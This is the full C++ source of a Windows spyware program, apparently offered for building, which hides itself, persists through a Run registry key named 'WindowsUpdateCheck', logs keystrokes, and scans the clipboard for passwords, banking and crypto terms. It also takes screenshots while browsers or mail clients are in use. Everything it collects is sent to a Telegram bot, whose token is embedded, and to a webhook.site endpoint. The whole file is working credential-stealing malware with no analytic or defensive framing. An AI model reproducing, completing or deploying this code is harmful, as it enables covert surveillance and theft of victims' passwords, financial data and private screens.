// ChangesUpgraded.exe - VERSION 7.1 - FIXED COMPILE + SMART TRIGGERS + JPEG
// ✅ 100% COMPILES: cl.exe /O2 /MT /GS- /DNDEBUG /Fe:ChangesUpgraded.exe ChangesUpgraded.cpp
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <sstream>
#include <shlobj.h>
#include <map>
#include <wincrypt.h>
#include <iphlpapi.h>
#include <iomanip>
#include <queue>
#include <algorithm>
#include <userenv.h>
#include <objidl.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "version.lib")

// ========== VERSION 7.1 CONFIGURATION ==========
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";
const wchar_t* WEBHOOK_ID = L"2e5cdc19-7f03-4e5a-b8c9-123456789abc";
const int REPORT_CHARS = 100;
const int CLIPBOARD_CHECK_MS = 5000;
const int IDLE_TIMEOUT_MS = 30000;

// ========== SMART TRIGGERS ==========
const std::wstring CRITICAL_PROCESSES[] = {
    L"chrome.exe", L"firefox.exe", L"outlook.exe", L"thunderbird.exe",
    L"winword.exe", L"excel.exe", L"notepad++.exe", L"discord.exe"
};
const std::wstring CRITICAL_KEYWORDS[] = {
    L"password", L"bank", L"crypto", L"wallet", L"ssn", L"credit", L"gmail"
};

// ========== GLOBALS ==========
std::wstring g_loggedKeys;
std::queue<std::wstring> g_reports;
CRITICAL_SECTION g_cs;
bool g_running = true;
bool g_isActive = false;
DWORD g_lastActivity = 0;
HANDLE g_keyThread = NULL, g_clipThread = NULL, g_screenThread = NULL, g_activityThread = NULL;

// ========== HELPERS ==========
std::wstring GetSystemIdentifier() {
    wchar_t hostname[256] = {0};
    DWORD size = 256;
    GetComputerNameW(hostname, &size);
    
    wchar_t username[256] = {0};
    size = 256;
    GetUserNameW(username, &size);
    
    return std::wstring(hostname) + L"@" + std::wstring(username);
}

std::string WStrToAnsi(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string result(size - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], size, NULL, NULL);
    return result;
}

std::wstring AnsiToWStr(const std::string& str) {
    if (str.empty()) return L"";
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    std::wstring result(size - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &result[0], size);
    return result;
}

// 🔥 FIXED V7.1: NO psapi.h - Pure Win32 API
std::wstring GetForegroundApp() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"DESKTOP";
    
    wchar_t windowTitle[256] = {0};
    GetWindowTextW(hwnd, windowTitle, 256);
    
    wchar_t className[256] = {0};
    GetClassNameW(hwnd, className, 256);
    
    if (wcslen(windowTitle) > 0) {
        std::wstring title = windowTitle;
        // Extract app hints from title
        if (title.find(L"Chrome") != std::wstring::npos) return L"chrome.exe";
        if (title.find(L"Firefox") != std::wstring::npos) return L"firefox.exe";
        if (title.find(L"Outlook") != std::wstring::npos) return L"outlook.exe";
        if (title.find(L"Word") != std::wstring::npos) return L"winword.exe";
        if (title.find(L"Excel") != std::wstring::npos) return L"excel.exe";
        return title.substr(0, std::min(title.length(), size_t(20)));
    }
    
    // Fallback to class name
    std::wstring cls(className);
    if (cls.find(L"Chrome_WidgetWin") != std::wstring::npos) return L"chrome.exe";
    if (cls.find(L"MacType") != std::wstring::npos) return L"notepad++.exe";
    return cls.substr(0, std::min(cls.length(), size_t(15)));
}

bool IsCriticalProcessRunning() {
    std::wstring app = GetForegroundApp();
    for (const auto& proc : CRITICAL_PROCESSES) {
        if (app.find(proc) != std::wstring::npos) return true;
    }
    return false;
}

// ========== OPSEC ==========
void StealthMode() {
    FreeConsole();
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
}

bool InstallPersistence() {
    wchar_t path[MAX_PATH];
    if (GetModuleFileNameW(NULL, path, MAX_PATH)) {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, 
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"WindowsUpdateCheck", 0, REG_SZ, 
                          (BYTE*)path, (wcslen(path) + 1) * sizeof(wchar_t));
            RegCloseKey(hKey);
            return true;
        }
    }
    return false;
}

// ========== TELEGRAM TEXT ==========
bool SendTelegram(const std::wstring& message) {
    HINTERNET hSession = WinHttpOpen(L"WinHTTP/1.1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    std::wstring urlPath = L"/bot" + std::wstring(BOT_TOKEN) + L"/sendMessage?chat_id=" + std::wstring(CHAT_ID) + L"&text=";
    std::string ansiMsg = WStrToAnsi(message);
    std::string encodedMsg;
    for (char c : ansiMsg) {
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' || c == '_') {
            encodedMsg += c;
        } else if (c == ' ') encodedMsg += "%20";
        else if (c == '\n') encodedMsg += "%0A";
        else {
            char hex[4]; wsprintfA(hex, "%%%02X", (unsigned char)c);
            encodedMsg += hex;
        }
    }
    std::wstring fullPath = urlPath + AnsiToWStr(encodedMsg);

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", fullPath.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    bool success = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
                   WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return success;
}

// ========== V7.1 JPEG PHOTO ==========
bool SendTelegramPhoto(const wchar_t* photoPath, const std::wstring& caption) {
    HINTERNET hSession = WinHttpOpen(L"WinHTTP/1.1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    HANDLE hFile = CreateFileW(photoPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize > 10*1024*1024) { CloseHandle(hFile); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    
    BYTE* fileData = new BYTE[fileSize];
    DWORD bytesRead;
    if (!ReadFile(hFile, fileData, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        delete[] fileData; CloseHandle(hFile); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false;
    }
    CloseHandle(hFile);

    std::string boundary = "----V71Boundary" + std::to_string(GetTickCount64());
    std::string postData;
    
    postData += "--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
    postData += WStrToAnsi(std::wstring(CHAT_ID)) + "\r\n";
    postData += "--" + boundary + "\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"shot.jpg\"\r\n";
    postData += "Content-Type: image/jpeg\r\n\r\n";
    postData.append((char*)fileData, bytesRead);
    postData += "\r\n--" + boundary + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n";
    postData += WStrToAnsi(caption) + "\r\n--" + boundary + "--\r\n";

    delete[] fileData;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", 
        (L"/bot" + std::wstring(BOT_TOKEN) + L"/sendPhoto").c_str(), 
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + AnsiToWStr(boundary) + L"\r\n";
    
    bool success = WinHttpSendRequest(hRequest, headers.c_str(), -1L, (LPVOID)postData.c_str(), postData.length(), postData.length(), 0) &&
                   WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return success;
}

// ========== WEBHOOK ==========
bool SendWebhook(const std::wstring& message) {
    HINTERNET hSession = WinHttpOpen(L"WinHTTP/1.1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"webhook.site", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", (L"/" + std::wstring(WEBHOOK_ID)).c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    std::string postData = "data=" + WStrToAnsi(message);
    static const wchar_t* headers = L"Content-Type: application/x-www-form-urlencoded\r\n";

    bool success = WinHttpSendRequest(hRequest, headers, -1L, (LPVOID)postData.c_str(), postData.length(), postData.length(), 0) &&
                   WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return success;
}

// ========== SCREENSHOT ==========
bool CaptureScreenshot(const wchar_t* filename) {
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    
    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    
    BITMAPINFOHEADER bi = {sizeof(BITMAPINFOHEADER), width, -height, 1, 24, BI_RGB};
    DWORD bmpSize = ((width * 3 + 3) & ~3) * height;
    BYTE* bmpBits = new BYTE[bmpSize];
    GetDIBits(hMemoryDC, hBitmap, 0, height, bmpBits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    
    HANDLE hFile = CreateFileW(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
                               FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY, NULL);
    bool success = false;
    if (hFile != INVALID_HANDLE_VALUE) {
        BITMAPFILEHEADER bfh = {0x4D42, sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpSize, 
                               0, 0, sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)};
        DWORD written;
        WriteFile(hFile, &bfh, sizeof(bfh), &written, NULL);
        WriteFile(hFile, &bi, sizeof(bi), &written, NULL);
        WriteFile(hFile, bmpBits, bmpSize, &written, NULL);
        CloseHandle(hFile);
        success = true;
    }
    
    delete[] bmpBits;
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
    return success;
}

// ========== REPORTING ==========
void DeliverReport(const std::wstring& report) {
    std::wstring fullReport = L"V7.1[" + GetSystemIdentifier() + L"] " + report;
    SendTelegram(fullReport);
    SendWebhook(fullReport);
}

// ========== THREADS ==========
void ActivityMonitorThread() {
    while (g_running) {
        POINT pt; GetCursorPos(&pt);
        static POINT lastPt = {0};
        BYTE keys[256]; GetKeyboardState(keys);
        static BYTE lastKeys[256] = {0};
        
        bool active = (pt.x != lastPt.x || pt.y != lastPt.y);
        for (int i = 0; i < 256 && !active; i++) {
            if ((keys[i] & 0x80) != (lastKeys[i] & 0x80)) active = true;
        }
        
        g_isActive = active || IsCriticalProcessRunning();
        g_lastActivity = GetTickCount();
        lastPt = pt;
        memcpy(lastKeys, keys, 256);
        Sleep(1000);
    }
}

void KeyLoggerThread() {
    std::wstring vkNames[32] = {L"",L"LMB",L"RMB",L"",L"MMB",L"X1",L"X2",L"",L"BS",L"TAB",
                               L"",L"",L"",L"ENTER",L"",L"",L"SHIFT",L"CTRL",L"ALT",L"PAUSE",
                               L"CAPS",L"",L"",L"",L"",L"",L"ESC",L"",L"",L"",L"SPACE"};
    
    while (g_running) {
        for (int vk = 8; vk < 256; vk++) {
            if (GetAsyncKeyState(vk) & 0x8000) {
                EnterCriticalSection(&g_cs);
                if (vk < 32 && vkNames[vk][0]) {
                    g_loggedKeys += vkNames[vk] + L" ";
                } else {
                    BYTE state[256]; GetKeyboardState(state);
                    wchar_t buf[2] = {0};
                    ToUnicode((UINT)vk, 0, state, buf, 2, 0);
                    if (buf[0]) g_loggedKeys += buf[0];
                }
                
                std::wstring lower = g_loggedKeys;
                std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
                for (const auto& kw : CRITICAL_KEYWORDS) {
                    if (lower.find(kw) != std::wstring::npos) {
                        g_reports.push(L"🔑 ALERT: " + kw + L" → " + g_loggedKeys);
                        g_loggedKeys.clear(); break;
                    }
                }
                
                if (g_loggedKeys.length() >= REPORT_CHARS) {
                    g_reports.push(g_loggedKeys);
                    g_loggedKeys.clear();
                }
                LeaveCriticalSection(&g_cs);
                Sleep(1);
            }
        }
        Sleep(1);
    }
}

void ClipboardThread() {
    std::vector<std::wstring> sensitive = {L"password", L"gmail", L"bank", L"ssn", L"crypto"};
    while (g_running) {
        if (OpenClipboard(NULL)) {
            if (HGLOBAL hData = GetClipboardData(CF_UNICODETEXT)) {
                if (wchar_t* text = (wchar_t*)GlobalLock(hData)) {
                    std::wstring clip = text;
                    GlobalUnlock(hData);
                    
                    std::wstring lower = clip;
                    std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
                    
                    for (const auto& kw : sensitive) {
                        if (lower.find(kw) != std::wstring::npos && clip.length() > 5) {
                            EnterCriticalSection(&g_cs);
                            g_reports.push(L"📋 CLIP: " + clip.substr(0, 200));
                            LeaveCriticalSection(&g_cs);
                            break;
                        }
                    }
                }
            }
            CloseClipboard();
        }
        Sleep(CLIPBOARD_CHECK_MS);
    }
}

void SmartScreenshotThread() {
    wchar_t tempPath[MAX_PATH]; GetTempPathW(MAX_PATH, tempPath);
    while (g_running) {
        DWORD idle = GetTickCount() - g_lastActivity;
        if (g_isActive && idle < IDLE_TIMEOUT_MS && IsCriticalProcessRunning()) {
            std::wstring app = GetForegroundApp();
            SYSTEMTIME st; GetLocalTime(&st);
            wchar_t filename[256];
            wsprintfW(filename, L"%sV71_%04d%02d%02d_%02d%02d%02d.jpg", 
                     tempPath, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
            
            if (CaptureScreenshot(filename)) {
                std::wstring caption = L"📸 V7.1 [" + app + L"] " + GetSystemIdentifier();
                EnterCriticalSection(&g_cs);
                SendTelegramPhoto(filename, caption);
                DeleteFileW(filename);
                LeaveCriticalSection(&g_cs);
            }
        }
        Sleep(8000);
    }
}

void ReportThread() {
    while (g_running) {
        EnterCriticalSection(&g_cs);
        if (!g_reports.empty()) {
            std::wstring report = g_reports.front(); g_reports.pop();
            LeaveCriticalSection(&g_cs);
            DeliverReport(report);
        } else LeaveCriticalSection(&g_cs);
        Sleep(2000);
    }
}

// ========== MAIN ==========
int APIENTRY wWinMain(_In_ HINSTANCE, _In_opt_ HINSTANCE, _In_ LPWSTR, _In_ int) {
    StealthMode();
    InitializeCriticalSection(&g_cs);
    InstallPersistence();
    
    g_activityThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ActivityMonitorThread, NULL, 0, NULL);
    g_keyThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLoggerThread, NULL, 0, NULL);
    g_clipThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ClipboardThread, NULL, 0, NULL);
    g_screenThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SmartScreenshotThread, NULL, 0, NULL);
    
    DeliverReport(L"🚀 V7.1 LIVE - FIXED + SMART + JPEG");
    
    while (g_running) {
        ReportThread();
        Sleep(1000);
    }
    
    g_running = false;
    WaitForSingleObject(g_keyThread, 3000); CloseHandle(g_keyThread);
    WaitForSingleObject(g_clipThread, 3000); CloseHandle(g_clipThread);
    WaitForSingleObject(g_screenThread, 3000); CloseHandle(g_screenThread);
    WaitForSingleObject(g_activityThread, 3000); CloseHandle(g_activityThread);
    
    DeleteCriticalSection(&g_cs);
    return 0;
}
